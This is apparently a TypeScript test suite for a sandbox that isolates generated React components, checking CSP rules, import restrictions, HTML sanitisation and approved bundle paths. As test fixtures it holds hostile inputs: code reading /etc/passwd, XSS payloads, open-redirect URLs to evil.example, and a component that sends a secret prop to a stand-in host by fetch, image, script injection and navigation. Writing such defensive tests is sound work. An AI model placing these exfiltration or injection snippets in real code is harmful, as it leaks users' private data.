import assert from 'node:assert/strict';
import test from 'node:test';

import {
  compileSandbox,
  parseComponent,
} from '../../../lib/studio/components.ts';

const payload = () => ({
  name: 'Counter',
  description: 'A counter',
  version: '1.0.0',
  source:
    "import React from 'react'; export default function Counter(){const [n,set]=React.useState(0);return <button onClick={()=>set(n+1)}>{n}</button>}",
  portableHtml: '<p>Counter starts at zero.</p>',
  portableText: 'Counter starts at zero.',
  properties: {},
  example: {},
  accessibility: 'Uses a native button with visible count.',
});
test('generated bundles are isolated with no network or credential access', async () => {
  const component = parseComponent(JSON.stringify(payload()));
  const html = await compileSandbox(component);
  assert.match(html, /connect-src 'none'/);
  assert.match(html, /default-src 'none'/);
  assert.match(html, /script-src 'unsafe-inline'/);
  assert.doesNotMatch(html, /script-src 'nonce-/);
  assert.doesNotMatch(html, /src="https?:/);
});
test('component code cannot import server modules or arbitrary dependencies', async () => {
  const component = parseComponent(
    JSON.stringify({
      ...payload(),
      source:
        "import fs from 'node:fs'; export default function X(){ return <p>{fs.readFileSync('/etc/passwd')}</p>}",
    })
  );
  await assert.rejects(
    compileSandbox(component),
    /Components may only import React/
  );
  for (const source of [
    "export default function X(){return null}; export { default as Y } from 'node:fs'",
    "export default function X(){ import('https://example.com/x.js'); return <p>X</p> }",
    "export default function X(){ require('node:fs'); return <p>X</p> }",
  ])
    await assert.rejects(
      compileSandbox(parseComponent(JSON.stringify({ ...payload(), source }))),
      /Components may only import React/
    );
  await assert.rejects(
    compileSandbox(
      parseComponent(
        JSON.stringify({
          ...payload(),
          source: 'export const X = () => <p>X</p>',
        })
      )
    ),
    /default export/
  );
});
test('portable fallback strips executable HTML and unsafe links', () => {
  const component = parseComponent(
    JSON.stringify({
      ...payload(),
      portableHtml:
        '<script>alert(1)</script><p onclick="alert(2)">Safe</p><a href="javascript:alert(3)">Link</a>',
    })
  );
  assert.equal(component.portableHtml, '<p>Safe</p><a>Link</a>');
});
test('incomplete generation cannot become an approvable proposal', () => {
  assert.throws(() => parseComponent('{"name":"Counter"}'), /required/);
});

test('public components permit only the exact published bundle path and retain a static alternative', async () => {
  const { registerHooks } = await import('node:module');
  registerHooks({
    load(url, context, nextLoad) {
      return url.endsWith('.css')
        ? { format: 'module', source: 'export default {};', shortCircuit: true }
        : nextLoad(url, context);
    },
  });
  const { default: StudioBlock, approvedBundlePath } =
    await import('../../../components/mdx/StudioBlock.tsx');
  const { createElement } = await import('react');
  const { renderToStaticMarkup } = await import('react-dom/server');
  const id = '12345678-1234-1234-1234-123456789abc',
    version = '1.2.3',
    src = `/generated-blocks/${id}/${version}-${'a'.repeat(20)}.html`;
  assert.equal(approvedBundlePath(id, version, src), true);
  for (const unsafe of [
    'https://evil.example/a.html',
    `//evil.example${src}`,
    `${src}?redirect=evil`,
    `${src}/../../private`,
  ])
    assert.equal(approvedBundlePath(id, version, unsafe), false);
  const portable = Buffer.from('The chart shows three improvements.').toString(
    'base64url'
  );
  const html = renderToStaticMarkup(
    createElement(StudioBlock, { id, version, src, portable })
  );
  assert.match(html, /sandbox="allow-scripts"/);
  assert.match(html, /The chart shows three improvements/);
  assert.match(html, /aria-describedby=/);
  const unsafe = renderToStaticMarkup(
    createElement(StudioBlock, {
      id,
      version,
      src: 'https://evil.example',
      portable,
    })
  );
  assert.doesNotMatch(unsafe, /<iframe/);
  assert.match(unsafe, /The chart shows three improvements/);
  const unreadable = renderToStaticMarkup(
    createElement(StudioBlock, {
      id,
      version,
      src,
      portable: Buffer.from('{danger()}').toString('base64url'),
    })
  );
  assert.doesNotMatch(unreadable, /<iframe/);
});

test(
  'browser sandbox blocks external scripts, fetch, images, own-frame and ancestor navigation without sending draft props',
  { skip: process.env.STUDIO_TEST_BROWSER !== '1' },
  async () => {
    const { chromium } = await import('@playwright/test');
    const browser = await chromium.launch({ headless: true });
    try {
      const counterPage = await browser.newPage();
      await counterPage.setContent(
        await compileSandbox(parseComponent(JSON.stringify(payload())))
      );
      const counter = counterPage.frameLocator('iframe').getByRole('button');
      await counter.click();
      assert.equal(await counter.textContent(), '1');
      await counterPage.close();
      const page = await browser.newPage();
      const outbound: string[] = [];
      await page.route('**/*', (route) => {
        outbound.push(route.request().url());
        return route.abort();
      });
      const mounted = page.waitForEvent('console', {
        predicate: (message) => message.text() === 'sandbox-running',
      });
      const component = parseComponent(
        JSON.stringify({
          ...payload(),
          source: `import React from 'react'; export default function Escape(props){React.useEffect(()=>{console.log('sandbox-running');const url='https://blocked.example/?secret='+encodeURIComponent(props.secret);fetch(url).catch(()=>{});new Image().src=url;const remote=document.createElement('script');remote.nonce=document.querySelector('script')?.nonce||'';remote.src=url;document.head.append(remote);try{window.parent.location.href=url}catch{};window.location.href=url;},[]);return <p>Interactive component mounted</p>}`,
        })
      );
      await page.setContent(
        await compileSandbox(component, { secret: 'private-draft-value' })
      );
      await mounted;
      // Give attempted asynchronous requests time to reach interception if CSP failed.
      await page.waitForTimeout(300);
      assert.deepEqual(outbound, []);
      assert.equal(page.url(), 'about:blank');
      await page.close();
    } finally {
      await browser.close();
    }
  }
);
